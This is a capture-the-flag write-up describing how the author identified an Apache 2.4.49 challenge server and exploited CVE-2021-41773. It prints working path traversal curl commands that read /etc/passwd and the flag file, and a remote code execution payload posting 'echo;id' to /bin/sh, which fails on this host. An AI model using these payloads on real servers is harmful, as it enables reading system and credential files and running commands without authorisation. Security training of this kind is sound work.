# Challenge

Santa's starting to get more serious into coding. He is now really invested in learning graphics and game programming. After he found that awesome graphics library, he has been quite a productive coder! Check out all his nice computer generated imagery here:

http://santascodingworkshop.norwayeast.azurecontainer.io/

> **Hint:** Now where can the vulnerability be hiding? Is it in one of the games or graphics demos? And wasn't this a pwn chall? Where is my bin?

# Writeup

Doing dirbuster + manual looking. Not seeing a whole lot. Did whatweb to see details of the webserver:

```bash
$ whatweb -a 3 santascodingworkshop.norwayeast.azurecontainer.io

http://santascodingworkshop.norwayeast.azurecontainer.io [200 OK] Apache[2.4.49], Country[UNITED STATES][US], HTTPServer[Unix][Apache/2.4.49 (Unix)], IP[20.100.137.205], Script
```

Apache 2.4.49. I know that latest is 2.4.54 so I search google for vulnerability for 2.4.49 and there is RCE and Path Traversal ([CVE-2021-41773](CVE-2021-41773)). 

[This blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013) shows me simple ways to use this. So I test teh first one to get /etc/passwd.

```bash
$ curl http://santascodingworkshop.norwayeast.azurecontainer.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
*snip*
```

So there we go. Now I just guess flag.txt is in root folder so. Based on previous attempts

```bash
$ curl http://santascodingworkshop.norwayeast.azurecontainer.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt

${74I5_I5_W4Y_W3_C@N7_4@V3_NIC3_74IN65:@:@:@:@}
```

Bingo! :) 

# Can we do RCE?

```
curl -X POST http://santascodingworkshop.norwayeast.azurecontainer.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "echo;id"

Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

Seems like this is not the case, according to the vulnerability there must be a module loaded for RCE and if it was it would return the id instead for the binary.

Well I got the flag!